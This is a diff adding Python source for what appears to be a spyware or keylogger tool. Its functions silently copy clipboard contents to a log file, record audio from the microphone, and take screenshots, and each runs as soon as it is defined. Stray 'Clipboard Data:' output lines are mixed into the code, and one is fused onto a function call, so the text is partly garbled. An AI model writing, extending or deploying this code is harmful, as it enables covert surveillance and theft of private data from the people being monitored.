@@ -1,0 +1,29 @@
+Clipboard Data: 
+"""----------------------------Clipboard Feature-------------------------------"""
+def copy_clipboard():
+    with open(file_path+extend+clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+        
+            f.write("Clipboard Data: \n" + pasted_data)
+        
+        except:
+            f.write("Clipboard could not be copied")
+        f.close()
+copy_clipboard()Clipboard Data: 
+"""---------------------Audio & SS Feature------------------------------"""
+def microphone():
+    fs = 44100  ## Sample rate
+    seconds = microphone_time  ## Duration of recording
+
+    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+    sd.wait()  ## Wait until recording is finished
+    write(file_path+extend+audio_information, fs, myrecording)  ## Save as WAV file
+microphone()
+
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(file_path+extend+screenshot_information)
+screenshot()
